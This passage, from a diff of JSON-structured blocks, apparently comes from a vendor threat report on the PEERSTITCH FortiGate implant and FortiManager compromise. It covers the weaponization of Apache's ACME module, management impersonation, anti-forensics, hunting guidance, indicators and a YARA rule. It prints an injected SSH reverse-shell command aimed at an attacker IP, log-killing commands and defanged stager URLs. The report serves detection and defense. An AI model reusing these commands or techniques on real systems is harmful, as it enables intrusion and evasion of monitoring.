+   "id": "b126",
+   "page": null,
+   "text": "Figure 7. Rouge ACME configuration file account.json.",
+   "type": "caption",
+   "section": "Weaponization Mechanics"
+  },
+  {
+   "id": "b127",
+   "page": null,
+   "text": "2). Challenge orchestration: The order.json file outlines the pending certificate order, mapping the authorization and finalization URLs directly to the attacker's server",
+   "type": "paragraph",
+   "section": "Weaponization Mechanics"
+  },
+  {
+   "id": "b128",
+   "page": null,
+   "text": "Figure 8. Rouge ACME configuration file order.json.",
+   "type": "caption",
+   "section": "Weaponization Mechanics"
+  },
+  {
+   "id": "b129",
+   "page": null,
+   "text": "3). Command execution via DNS-01 challenge: MDChallengeDns01 was mapped directly to /bin/node. When Apache initiates a certificate validation challenge, it executes Node.js with parameters retrieved from the remote ACME server. The job.json debug log reveals how the attackers exploited this by injecting shell commands (kali@23.240.77[.]233:8084:b -F /tmp/upfile/ssh_config -i) directly into the domain name field of the challenge request, initiating an SSH-based reverse shell.",
+   "type": "paragraph",
+   "section": "Weaponization Mechanics"
+  },
+  {
+   "id": "b130",
+   "page": null,
+   "text": "Figure 9. Rouge ACME debug logs.",
+   "type": "caption",
+   "section": "Weaponization Mechanics"
+  },
+  {
+   "id": "b131",
+   "page": null,
+   "text": "4). Continuous polling loop: Setting MDRenewMode always forced the Apache daemon to continuously trigger these malicious renewal challenges. Because the DNS-01 challenge was mapped to /bin/node, this polling cycle ensured the continuous re-execution of the injected payload, establishing a persistent outbound reverse-shell communication channel.",
+   "type": "paragraph",
+   "section": "Weaponization Mechanics"
+  },
+  {
+   "id": "b132",
+   "page": null,
+   "text": "Management Impersonation and FortiGate to FortiManager Chained Exploitation",
+   "type": "heading",
+   "level": 2,
+   "section": "Management Impersonation and FortiGate to FortiManager Chained Exploitation"
+  },
+  {
+   "id": "b133",
+   "page": null,
+   "text": "FortiGate to FortiManager (FGFM) communications occur over TCP port 541 using cryptographic trust material requested and validated against appliance serial numbers. The archive exfiltrated during the initial FortiJump compromise contained this material, along with the serial numbers and management relationships of every downstream device.",
+   "type": "paragraph",
+   "section": "Management Impersonation and FortiGate to FortiManager Chained Exploitation"
+  },
+  {
+   "id": "b134",
+   "page": null,
+   "text": "Following FGFM interactions from external infrastructure over TCP port 541, an administrative account named FortiGateCloud downloaded complete running configurations from multiple managed firewalls. The victim organization operated no FortiManager Cloud tenant, and no such account was provisioned on the affected devices.",
+   "type": "paragraph",
+   "section": "Management Impersonation and FortiGate to FortiManager Chained Exploitation"
+  },
+  {
+   "id": "b135",
+   "page": null,
+   "text": "We assess with a medium degree of confidence that the attackers issued these commands by impersonating the management platform over FGFM. Two paths were available to them, and the evidence does not distinguish between them:",
+   "type": "paragraph",
+   "section": "Management Impersonation and FortiGate to FortiManager Chained Exploitation"
+  },
+  {
+   "id": "b136",
+   "page": null,
+   "text": "Exploitation of CVE-2024-26009 to bypass FGFM authentication using the FortiManager's serial number",
+   "type": "list",
+   "section": "Management Impersonation and FortiGate to FortiManager Chained Exploitation"
+  },
+  {
+   "id": "b137",
+   "page": null,
+   "text": "Direct reuse of the exfiltrated trust material to authenticate as the legitimate FortiManager",
+   "type": "list",
+   "section": "Management Impersonation and FortiGate to FortiManager Chained Exploitation"
+  },
+  {
+   "id": "b138",
+   "page": null,
+   "text": "Asserting a management identity requires terminating the authentic FortiManager's session. It is possible that the attackers forced this session termination using CVE-2024-26008, consistent with the intermittent tunnel management interface drops described in the Anti-Forensics and Defense Evasion section below.",
+   "type": "paragraph",
+   "section": "Management Impersonation and FortiGate to FortiManager Chained Exploitation"
+  },
+  {
+   "id": "b139",
+   "page": null,
+   "text": "We are aware of other vulnerabilities in which the FortiGateCloud account has been misused to perform unauthorized actions, including:",
+   "type": "paragraph",
+   "section": "Management Impersonation and FortiGate to FortiManager Chained Exploitation"
+  },
+  {
+   "id": "b140",
+   "page": null,
+   "text": "CVE-2025-59718",
+   "type": "list",
+   "section": "Management Impersonation and FortiGate to FortiManager Chained Exploitation"
+  },
+  {
+   "id": "b141",
+   "page": null,
+   "text": "CVE-2025-59719",
+   "type": "list",
+   "section": "Management Impersonation and FortiGate to FortiManager Chained Exploitation"
+  },
+  {
+   "id": "b142",
+   "page": null,
+   "text": "The related single sign-on (SSO) issues tracked under FG-IR-26-060",
+   "type": "list",
+   "section": "Management Impersonation and FortiGate to FortiManager Chained Exploitation"
+  },
+  {
+   "id": "b143",
+   "page": null,
+   "text": "Each of these vulnerabilities requires the device to be enrolled in FortiGate Cloud/FortiCloud SSO, and the affected firewalls held no such enrollment. We exclude these vulnerabilities from scope for this intrusion. We note that the observed activity reused only the account name and none of the exploitation artifacts associated with those issues.",
+   "type": "paragraph",
+   "section": "Management Impersonation and FortiGate to FortiManager Chained Exploitation"
+  },
+  {
+   "id": "b144",
+   "page": null,
+   "text": "Anti-Forensics and Defense Evasion",
+   "type": "heading",
+   "level": 2,
+   "section": "Anti-Forensics and Defense Evasion"
+  },
+  {
+   "id": "b145",
+   "page": null,
+   "text": "The attackers took extensive measures to eliminate forensic artifacts:",
+   "type": "paragraph",
+   "section": "Anti-Forensics and Defense Evasion"
+  },
+  {
+   "id": "b146",
+   "page": null,
+   "text": "Service termination: Executed killall -9 miglogd and killall -9 syslogd to halt local and remote syslog generation prior to executing malicious auto-scripts",
+   "type": "list",
+   "section": "Anti-Forensics and Defense Evasion"
+  },
+  {
+   "id": "b147",
+   "page": null,
+   "text": "Crash log clearing: Issued FortiOS diagnostic command diagnose debug crashlog clear to wipe segmentation fault logs generated during initial memory injection attempts",
+   "type": "list",
+   "section": "Anti-Forensics and Defense Evasion"
+  },
+  {
+   "id": "b148",
+   "page": null,
+   "text": "Configuration rollback: Automatically deleted rogue administrator accounts, rogue VPN groups and auto-script objects (../../../../setup) shortly after execution",
+   "type": "list",
+   "section": "Anti-Forensics and Defense Evasion"
+  },
+  {
+   "id": "b149",
+   "page": null,
+   "text": "Decoy artifact creation: Overwrote /tmp/apache2/conf/md-acme.conf with a common string found in this file (#0 certs managed by ACME\\n\\n\\n) to mask reverse-shell configuration files",
+   "type": "list",
+   "section": "Anti-Forensics and Defense Evasion"
+  },
+  {
+   "id": "b150",
+   "page": null,
+   "text": "Process memory self-deletion: lldprx unlinked its own binary from disk and scanned /proc/ to terminate the staging setup process before exiting",
+   "type": "list",
+   "section": "Anti-Forensics and Defense Evasion"
+  },
+  {
+   "id": "b151",
+   "page": null,
+   "text": "Logging telemetry disruption: Log telemetry showed intermittent drops across the tunnel management interface during periods of malicious activity. We assess with medium confidence that the attackers deliberately induced this degradation to suppress real-time telemetry to central management consoles. This is consistent with the previously described pattern of telemetry suppression, including terminating miglogd and syslogd, clearing crash logs, and rolling back configuration objects. It’s possible that the attackers forced the disconnects using CVE-2024-26008 over TCP port 541. Available logs do not capture the triggered traffic, so we could not confirm the mechanism.",
+   "type": "list",
+   "section": "Anti-Forensics and Defense Evasion"
+  },
+  {
+   "id": "b152",
+   "page": null,
+   "text": "Detection Opportunities and Forensic Guidance",
+   "type": "heading",
+   "level": 2,
+   "section": "Detection Opportunities and Forensic Guidance"
+  },
+  {
+   "id": "b153",
+   "page": null,
+   "text": "Because PEERSTITCH runs entirely in memory without creating persistent files or listening ports, detection requires specialized hunting techniques that Table 2 below documents.",
+   "type": "paragraph",
+   "section": "Detection Opportunities and Forensic Guidance"
+  },
+  {
+   "id": "b154",
+   "page": null,
+   "text": "Detection Surface | Artifact/Indicator | Technical Hunting Guidance ¶ Volatile memory | 16 KB RWX mmap region | Inspect memory maps (/proc/<pid>/maps) of /bin/miglogd and /bin/iked for anonymous 16,384-byte regions with rwxp permissions ¶ Daemon integrity | NOP text patches | Verify text segment integrity at base+0x106F7B8, base+0x1072E20 and base+0x109A570 for 0xAA0003E0 (MOV X0, X0) ¶ System calls | Cross-PID /proc/mem access | Audit kernel syscall telemetry for open() and write() operations targeting /proc/<pid>/mem between miglogd and iked ¶ Diagnostic logs | Crashlog segmentation faults | Query diagnose debug crashlog read for Signal 11 (Segmentation Fault) crashes involving miglogd, iked or syslogd ¶ Configuration audit | Auto-script traversal objects | Inspect FortiOS configuration revisions for system.auto-script objects containing path traversal strings (../../)",
+   "type": "table",
+   "table": {
+    "rows": [
+     [
+      "Detection Surface",
+      "Artifact/Indicator",
+      "Technical Hunting Guidance"
+     ],
+     [
+      "Volatile memory",
+      "16 KB RWX mmap region",
+      "Inspect memory maps (/proc/<pid>/maps) of /bin/miglogd and /bin/iked for anonymous 16,384-byte regions with rwxp permissions"
+     ],
+     [
+      "Daemon integrity",
+      "NOP text patches",
+      "Verify text segment integrity at base+0x106F7B8, base+0x1072E20 and base+0x109A570 for 0xAA0003E0 (MOV X0, X0)"
+     ],
+     [
+      "System calls",
+      "Cross-PID /proc/mem access",
+      "Audit kernel syscall telemetry for open() and write() operations targeting /proc/<pid>/mem between miglogd and iked"
+     ],
+     [
+      "Diagnostic logs",
+      "Crashlog segmentation faults",
+      "Query diagnose debug crashlog read for Signal 11 (Segmentation Fault) crashes involving miglogd, iked or syslogd"
+     ],
+     [
+      "Configuration audit",
+      "Auto-script traversal objects",
+      "Inspect FortiOS configuration revisions for system.auto-script objects containing path traversal strings (../../)"
+     ]
+    ],
+    "source": "html_dom",
+    "caption": null,
+    "headers": null
+   },
+   "layout": "table",
+   "section": "Detection Opportunities and Forensic Guidance"
+  },
+  {
+   "id": "b155",
+   "page": null,
+   "text": "Table 2. PEERSTITCH's specialized hunting techniques.",
+   "type": "paragraph",
+   "section": "Detection Opportunities and Forensic Guidance"
+  },
+  {
+   "id": "b156",
+   "page": null,
+   "text": "Conclusion",
+   "type": "heading",
+   "level": 2,
+   "section": "Conclusion"
+  },
+  {
+   "id": "b157",
+   "page": null,
+   "text": "This intrusion highlights a growing threat, the weaponization of centralized edge management ecosystems to compromise downstream networks. One compromised appliance yielded the cryptographic keys, credentials and network topology for more than 500 firewalls, including devices protecting client organizations.",
+   "type": "paragraph",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b158",
+   "page": null,
+   "text": "The discovery of the PEERSTITCH implant demonstrates the increasing technical maturity of edge-device malware. By operating as a one-shot injector, avoiding persistent disk artifacts and building a covert inter-process communication bridge inside process memory, the attackers achieved sustained persistence while evading traditional monitoring.",
+   "type": "paragraph",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b159",
+   "page": null,
+   "text": "For organizations that manage infrastructure on behalf of others, the management platform is the highest-value target on the network. Compromising the management platform is not contained by the boundary of the organization that owns it. That compromise also does not end when the platform is patched.",
+   "type": "paragraph",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b160",
+   "page": null,
+   "text": "The cryptographic trust material governing the platform's relationship with every managed device leaves with the attacker and remains valid until it is rotated. Defenders must treat edge management interfaces with the highest level of zero trust isolation. They must also treat the credentials and certificates those interfaces hold as compromised the moment the platform is.",
+   "type": "paragraph",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b161",
+   "page": null,
+   "text": "Palo Alto Networks customers are better protected from the threats discussed above through the following products and services:",
+   "type": "paragraph",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b162",
+   "page": null,
+   "text": "The Advanced WildFire machine-learning models and analysis techniques have been reviewed and updated in light of the indicators shared in this research.",
+   "type": "list",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b163",
+   "page": null,
+   "text": "Advanced URL Filtering, Advanced DNS Security and Advanced IP Defense are designed to identify known domains and URLs associated with this activity as malicious.",
+   "type": "list",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b164",
+   "page": null,
+   "text": "Next-Generation Firewall with the Advanced Threat Prevention security subscription can help block CVE-2024-47575 with best practices via the following Threat Prevention signatures 95788, 96788.",
+   "type": "list",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b165",
+   "page": null,
+   "text": "Cortex Xpanse is designed to identify exposed devices and applications on the public internet and escalate these findings to defenders.",
+   "type": "list",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b166",
+   "page": null,
+   "text": "Device Security is designed to proactively protect the specialized device attack surface of operational environments, providing deep visibility into industrial protocols, actionable risk insights, and adaptive security enforcement across all OT and IoT assets.",
+   "type": "list",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b167",
+   "page": null,
+   "text": "If you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call:",
+   "type": "paragraph",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b168",
+   "page": null,
+   "text": "North America Toll Free: +1 (866) 486-4842 (866.4.UNIT42)",
+   "type": "list",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b169",
+   "page": null,
+   "text": "UK: +44.20.3743.3660",
+   "type": "list",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b170",
+   "page": null,
+   "text": "Europe and Middle East: +31.20.299.3130",
+   "type": "list",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b171",
+   "page": null,
+   "text": "Asia: +65.6983.8730",
+   "type": "list",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b172",
+   "page": null,
+   "text": "Japan: +81.50.1790.0200",
+   "type": "list",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b173",
+   "page": null,
+   "text": "Australia: +61.2.4062.7950",
+   "type": "list",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b174",
+   "page": null,
+   "text": "India: 000 800 050 45107",
+   "type": "list",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b175",
+   "page": null,
+   "text": "South Korea: +82.080.467.8774",
+   "type": "list",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b176",
+   "page": null,
+   "text": "Palo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about the Cyber Threat Alliance.",
+   "type": "paragraph",
+   "section": "Conclusion"
+  },
+  {
+   "id": "b177",
+   "page": null,
+   "text": "Indicators of Compromise",
+   "type": "heading",
+   "level": 2,
+   "section": "Indicators of Compromise"
+  },
+  {
+   "id": "b178",
+   "page": null,
+   "text": "Table 3 lists the filenames and SHA-256 hashes associated with PEERSTITCH activity.",
+   "type": "paragraph",
+   "section": "Indicators of Compromise"
+  },
+  {
+   "id": "b179",
+   "page": null,
+   "text": "Type | Value | Context ¶ SHA-256 hash | b9fb0b27ddd59b58d3ae53c7227298a3e0de1e6f868b9429ae21533bb9cd1e70 | ELF 64-bit ARM64 executable; PEERSTITCH core ptrace injector ¶ SHA-256 hash | 829b1cd270b30565739a478441833f49f10a49bd06f0d18cc96c8ae4a0431f11 | PEERSTITCH ARM64 mmap shellcode bootstrap header (45 bytes) ¶ SHA-256 hash | bd064244dad748cf2a44074bee56f5bfab4a2b18ee944b75d1b3febd4c1fe02a | PEERSTITCH ARM64 core hook injection data block (1,280 bytes) ¶ SHA-256 hash | 9c4c4436ff5cdf0d6d68f5108031cbf3708a095cde4ef8c09316af7a7110437e | PEERSTITCH staging and preparation script ¶ SHA-256 hash | fc1b10c58057ef9f1f9a1e2a3d4a1c89f43b0ead451398c70ed7a6e0312b36ee | PEERSTITCH Node.js deployment orchestrator ¶ SHA-256 hash | f84eea718526706afdf2d1a2774fab76ecb11c18fb61995a37be8249c5e379ab | PEERSTITCH emscripten JavaScript runtime component ¶ SHA-256 hash | b7ae166fd49a7ecfe6322a80b8aa56d6aa0825d8f5d106dab2e4fb7d14ce15a8 | PEERSTITCH emscripten WebAssembly binary module ¶ SHA-256 hash | 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92 | PEERSTITCH runtime shared secret key artifact (hard-coded string “123456”) ¶ Filename | lldprx | PEERSTITCH malware ¶ Filename | pM.js | PEERSTITCH malware installer script ¶ Filename | index.js | PEERSTITCH emscripten JS component ¶ Filename | index.wasm | PEERSTITCH emscripten WASM module ¶ Filename | ipssem.js | PEERSTITCH orchestrator script ¶ Filename and path | ../../../../setup | Path-traversal auto-script name ¶ Filename and path | ../../tmp/apache2/conf/md-acme.conf | Path-traversal auto-script name",
+   "type": "table",
+   "table": {
+    "rows": [
+     [
+      "Type",
+      "Value",
+      "Context"
+     ],
+     [
+      "SHA-256 hash",
+      "b9fb0b27ddd59b58d3ae53c7227298a3e0de1e6f868b9429ae21533bb9cd1e70",
+      "ELF 64-bit ARM64 executable; PEERSTITCH core ptrace injector"
+     ],
+     [
+      "SHA-256 hash",
+      "829b1cd270b30565739a478441833f49f10a49bd06f0d18cc96c8ae4a0431f11",
+      "PEERSTITCH ARM64 mmap shellcode bootstrap header (45 bytes)"
+     ],
+     [
+      "SHA-256 hash",
+      "bd064244dad748cf2a44074bee56f5bfab4a2b18ee944b75d1b3febd4c1fe02a",
+      "PEERSTITCH ARM64 core hook injection data block (1,280 bytes)"
+     ],
+     [
+      "SHA-256 hash",
+      "9c4c4436ff5cdf0d6d68f5108031cbf3708a095cde4ef8c09316af7a7110437e",
+      "PEERSTITCH staging and preparation script"
+     ],
+     [
+      "SHA-256 hash",
+      "fc1b10c58057ef9f1f9a1e2a3d4a1c89f43b0ead451398c70ed7a6e0312b36ee",
+      "PEERSTITCH Node.js deployment orchestrator"
+     ],
+     [
+      "SHA-256 hash",
+      "f84eea718526706afdf2d1a2774fab76ecb11c18fb61995a37be8249c5e379ab",
+      "PEERSTITCH emscripten JavaScript runtime component"
+     ],
+     [
+      "SHA-256 hash",
+      "b7ae166fd49a7ecfe6322a80b8aa56d6aa0825d8f5d106dab2e4fb7d14ce15a8",
+      "PEERSTITCH emscripten WebAssembly binary module"
+     ],
+     [
+      "SHA-256 hash",
+      "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92",
+      "PEERSTITCH runtime shared secret key artifact (hard-coded string “123456”)"
+     ],
+     [
+      "Filename",
+      "lldprx",
+      "PEERSTITCH malware"
+     ],
+     [
+      "Filename",
+      "pM.js",
+      "PEERSTITCH malware installer script"
+     ],
+     [
+      "Filename",
+      "index.js",
+      "PEERSTITCH emscripten JS component"
+     ],
+     [
+      "Filename",
+      "index.wasm",
+      "PEERSTITCH emscripten WASM module"
+     ],
+     [
+      "Filename",
+      "ipssem.js",
+      "PEERSTITCH orchestrator script"
+     ],
+     [
+      "Filename and path",
+      "../../../../setup",
+      "Path-traversal auto-script name"
+     ],
+     [
+      "Filename and path",
+      "../../tmp/apache2/conf/md-acme.conf",
+      "Path-traversal auto-script name"
+     ]
+    ],
+    "source": "html_dom",
+    "caption": null,
+    "headers": null
+   },
+   "layout": "table",
+   "section": "Indicators of Compromise"
+  },
+  {
+   "id": "b180",
+   "page": null,
+   "text": "Table 3. Files and SHA-256 hashes for PEERSTITCH activity.",
+   "type": "paragraph",
+   "section": "Indicators of Compromise"
+  },
+  {
+   "id": "b181",
+   "page": null,
+   "text": "Table 4 lists the network indicators associated with PEERSTITCH activity.",
+   "type": "paragraph",
+   "section": "Indicators of Compromise"
+  },
+  {
+   "id": "b182",
+   "page": null,
+   "text": "Type | Value | Context ¶ IP address | 23.240.77[.]233 | Hosting installer and PEERSTITCH malware ¶ IP address | 47.18.167[.]159 | Hosting installer and PEERSTITCH malware ¶ IP address | 45.32.41[.]202 | Rogue FortiGate IP added to FortiManager ¶ IP address | 198.199.122[.]22 | Rogue FortiGate IP added to FortiManager ¶ URL | hxxp[:]//23.240.77[.]233:8085/pM.js | Hosting PEERSTITCH stager ¶ URL | hxxp[:]//47.18.167[.]159:8085/pM.js | Hosting PEERSTITCH stager ¶ URL | hxxp[:]//23.240.77[.]233:8084/directory | ACME certificate authority abuse ¶ URL | hxxp[:]//23.240.77[.]233:8084/acme/new-acct | ACME certificate authority abuse ¶ URL | hxxp[:]//23.240.77[.]233:8084/acme/order/11111 | ACME certificate authority abuse ¶ URL | hxxp[:]//23.240.77[.]233:8084/acme/authz/1 | ACME certificate authority abuse ¶ URL | hxxp[:]//23.240.77[.]233:8084/acme/finalize/61924744/774083503 | ACME certificate authority abuse",
+   "type": "table",
+   "table": {
+    "rows": [
+     [
+      "Type",
+      "Value",
+      "Context"
+     ],
+     [
+      "IP address",
+      "23.240.77[.]233",
+      "Hosting installer and PEERSTITCH malware"
+     ],
+     [
+      "IP address",
+      "47.18.167[.]159",
+      "Hosting installer and PEERSTITCH malware"
+     ],
+     [
+      "IP address",
+      "45.32.41[.]202",
+      "Rogue FortiGate IP added to FortiManager"
+     ],
+     [
+      "IP address",
+      "198.199.122[.]22",
+      "Rogue FortiGate IP added to FortiManager"
+     ],
+     [
+      "URL",
+      "hxxp[:]//23.240.77[.]233:8085/pM.js",
+      "Hosting PEERSTITCH stager"
+     ],
+     [
+      "URL",
+      "hxxp[:]//47.18.167[.]159:8085/pM.js",
+      "Hosting PEERSTITCH stager"
+     ],
+     [
+      "URL",
+      "hxxp[:]//23.240.77[.]233:8084/directory",
+      "ACME certificate authority abuse"
+     ],
+     [
+      "URL",
+      "hxxp[:]//23.240.77[.]233:8084/acme/new-acct",
+      "ACME certificate authority abuse"
+     ],
+     [
+      "URL",
+      "hxxp[:]//23.240.77[.]233:8084/acme/order/11111",
+      "ACME certificate authority abuse"
+     ],
+     [
+      "URL",
+      "hxxp[:]//23.240.77[.]233:8084/acme/authz/1",
+      "ACME certificate authority abuse"
+     ],
+     [
+      "URL",
+      "hxxp[:]//23.240.77[.]233:8084/acme/finalize/61924744/774083503",
+      "ACME certificate authority abuse"
+     ]
+    ],
+    "source": "html_dom",
+    "caption": null,
+    "headers": null
+   },
+   "layout": "table",
+   "section": "Indicators of Compromise"
+  },
+  {
+   "id": "b183",
+   "page": null,
+   "text": "Table 4. Network indicators for PEERSTITCH activity.",
+   "type": "paragraph",
+   "section": "Indicators of Compromise"
+  },
+  {
+   "id": "b184",
+   "page": null,
+   "text": "The following is a YARA rule to discover PEERSTITCH activity:",
+   "type": "paragraph",
+   "section": "Indicators of Compromise"
+  },
+  {
+   "id": "b185",
+   "page": null,
+   "text": "1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 | rule u42_apt_linux_PEERSTITCH_fortigate_implant { meta: author = \"Unit 42 - PaloAltoNetworks\" description = \"Identifies FortiGate process memory patching implant (ptrace injector targeting miglogd/iked)\" hash = \"b9fb0b27ddd59b58d3ae53c7227298a3e0de1e6f868b9429ae21533bb9cd1e70\" malware_family = \"PEERSTITCH_fortigate_implant\" strings: // ARM64 mmap shellcode template (.rodata 0x45A688) // Allocates 16KB RWX via mmap, writes trampoline, jumps to it // Full 45-byte sequence: MOV X0-X5,X8 setup -> SVC #0 -> MOV W1,#0xD4200000 -> STR -> BR X0 $shellcode_template = { 00 00 80 D2 // MOV X0, #0 01 00 88 D2 // MOV X1, #0x4000 E2 00 80 D2 // MOV X2, #7 (RWX) 43 04 80 D2 // MOV X3, #0x22 (MAP_PRIVATE|MAP_ANONYMOUS) 04 00 80 D2 // MOV X4, #0 05 00 80 D2 // MOV X5, #0 C8 1B 80 D2 // MOV X8, #0xDE (__NR_mmap) 01 00 00 D4 // SVC #0 01 84 BA 52 // MOV W1, #0xD4200000 01 00 00 B9 // STR W1, [X0] 00 00 1F D6 // BR X0 } // Injection payload entry prologue (.data 0x494048) // ADR+LDUR dispatch -> stack frame 0x110 -> bulk STP register save $injection_entry = { 1E 00 00 10 // ADR X30, #0 DE C3 40 F8 // LDUR X30, [X30, #0xC] C0 03 1F D6 // RET 00 00 00 00 00 00 00 00 00 00 00 00 FF 43 04 D1 // SUB SP, SP, #0x110 E0 0F 00 F9 // STR X0, [SP, #0x18] E1 0B 02 A9 // STP X1, X2, [SP, #0x20] E3 13 03 A9 // STP X3, X4, [SP, #0x30] E5 1B 04 A9 // STP X5, X6, [SP, #0x40] E7 23 05 A9 // STP X7, X8, [SP, #0x50] E9 2B 06 A9 // STP X9, X10, [SP, #0x60] EB 33 07 A9 // STP X11, X12, [SP, #0x70] ED 3B 08 A9 // STP X13, X14, [SP, #0x80] EF 43 09 A9 // STP X15, X16, [SP, #0x90] F1 4B 0A A9 // STP X17, X18, [SP, #0xA0] F3 53 0B A9 // STP X19, X20, [SP, #0xB0] F5 5B 0C A9 // STP X21, X22, [SP, #0xC0] F7 63 0D A9 // STP X23, X24, [SP, #0xD0] F9 6B 0E A9 // STP X25, X26, [SP, #0xE0] FB 73 0F A9 // STP X27, X28, [SP, #0xF0] FD 7B 10 A9 // STP X29, X30, [SP, #0x100] } // Operational strings (.rodata 0x45A600-0x45A678) $s_miglogd = \"/bin/miglogd\" $s_iked = \"/bin/iked\" $s_match_ip = \"169.254.0.1\" $s_cover_path = \"/tmp/apache2/conf/md-acme.conf\" $s_cover_content = \"#0 certs managed by ACME\" $s_proc_mem = \"/proc/%d/mem\" condition: uint32(0) == 0x464C457F and ( $shellcode_template or $injection_entry or (4 of ($s_*)) ) }",
+   "type": "table",
+   "table": {
+    "rows": [
+     [
+      "1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67",
+      "rule u42_apt_linux_PEERSTITCH_fortigate_implant { meta: author = \"Unit 42 - PaloAltoNetworks\" description = \"Identifies FortiGate process memory patching implant (ptrace injector targeting miglogd/iked)\" hash = \"b9fb0b27ddd59b58d3ae53c7227298a3e0de1e6f868b9429ae21533bb9cd1e70\" malware_family = \"PEERSTITCH_fortigate_implant\" strings: // ARM64 mmap shellcode template (.rodata 0x45A688) // Allocates 16KB RWX via mmap, writes trampoline, jumps to it // Full 45-byte sequence: MOV X0-X5,X8 setup -> SVC #0 -> MOV W1,#0xD4200000 -> STR -> BR X0 $shellcode_template = { 00 00 80 D2 // MOV X0, #0 01 00 88 D2 // MOV X1, #0x4000 E2 00 80 D2 // MOV X2, #7 (RWX) 43 04 80 D2 // MOV X3, #0x22 (MAP_PRIVATE|MAP_ANONYMOUS) 04 00 80 D2 // MOV X4, #0 05 00 80 D2 // MOV X5, #0 C8 1B 80 D2 // MOV X8, #0xDE (__NR_mmap) 01 00 00 D4 // SVC #0 01 84 BA 52 // MOV W1, #0xD4200000 01 00 00 B9 // STR W1, [X0] 00 00 1F D6 // BR X0 } // Injection payload entry prologue (.data 0x494048) // ADR+LDUR dispatch -> stack frame 0x110 -> bulk STP register save $injection_entry = { 1E 00 00 10 // ADR X30, #0 DE C3 40 F8 // LDUR X30, [X30, #0xC] C0 03 1F D6 // RET 00 00 00 00 00 00 00 00 00 00 00 00 FF 43 04 D1 // SUB SP, SP, #0x110 E0 0F 00 F9 // STR X0, [SP, #0x18] E1 0B 02 A9 // STP X1, X2, [SP, #0x20] E3 13 03 A9 // STP X3, X4, [SP, #0x30] E5 1B 04 A9 // STP X5, X6, [SP, #0x40] E7 23 05 A9 // STP X7, X8, [SP, #0x50] E9 2B 06 A9 // STP X9, X10, [SP, #0x60] EB 33 07 A9 // STP X11, X12, [SP, #0x70] ED 3B 08 A9 // STP X13, X14, [SP, #0x80] EF 43 09 A9 // STP X15, X16, [SP, #0x90] F1 4B 0A A9 // STP X17, X18, [SP, #0xA0] F3 53 0B A9 // STP X19, X20, [SP, #0xB0] F5 5B 0C A9 // STP X21, X22, [SP, #0xC0] F7 63 0D A9 // STP X23, X24, [SP, #0xD0] F9 6B 0E A9 // STP X25, X26, [SP, #0xE0] FB 73 0F A9 // STP X27, X28, [SP, #0xF0] FD 7B 10 A9 // STP X29, X30, [SP, #0x100] } // Operational strings (.rodata 0x45A600-0x45A678) $s_miglogd = \"/bin/miglogd\" $s_iked = \"/bin/iked\" $s_match_ip = \"169.254.0.1\" $s_cover_path = \"/tmp/apache2/conf/md-acme.conf\" $s_cover_content = \"#0 certs managed by ACME\" $s_proc_mem = \"/proc/%d/mem\" condition: uint32(0) == 0x464C457F and ( $shellcode_template or $injection_entry or (4 of ($s_*)) ) }"
+     ]
+    ],
+    "source": "html_dom",
+    "caption": null,
+    "headers": null
+   },
+   "layout": "table",
+   "section": "Indicators of Compromise"
+  },
+  {
+   "id": "b186",
+   "page": null,
+   "text": "Additional Resources",
+   "type": "heading",
+   "level": 2,
+   "section": "Additional Resources"
+  },
+  {
+   "id": "b187",
+   "page": null,
+   "text": "FortiBleed Operations Continue Targeting Exposed Systems Leading to Reports of Lockouts — Joint FBI and Secret Service Advisory, October 6, 2026",
+   "type": "list",
+   "section": "Additional Resources"
+  },
+  {
+   "id": "b188",
+   "page": null,
+   "text": "Missing authentication in fgfmsd — FortiGuard Labs PSIRT Advisory",
+   "type": "list",
+   "section": "Additional Resources"
+  },
+  {
+   "id": "b189",
+   "page": null,
+   "text": "Path Traversal in CLI - FortiGuard Labs PSIRT Advisory",
+   "type": "list",
+   "section": "Additional Resources"
+  },
+  {
+   "id": "b190",
+   "page": null,
+   "text": "FGFM protocol allows unauthenticated reset of the connection - FortiGuard Labs PSIRT Advisory",
+   "type": "list",
+   "section": "Additional Resources"
+  },
+  {
+   "id": "b191",
+   "page": null,
+   "text": "Weak authentication - FGFM protocol - FortiGuard Labs PSIRT Advisory",
+   "type": "list",
+   "section": "Additional Resources"
+  },
+  {
+   "id": "b192",
+   "page": null,
+   "text": "Administrative FortiCloud SSO authentication bypass - Fortiguard Labs PSIRT Advisory",
+   "type": "list",
+   "section": "Additional Resources"
+  },
+  {
+   "id": "b193",
+   "page": null,
+   "text": "Multiple Fortinet Products' FortiCloud SSO Login Authentication Bypass - FortiGuard Labs PSIRT Advisory",
+   "type": "list",
+   "section": "Additional Resources"
+  },
+  {
+   "id": "b194",
+   "page": null,
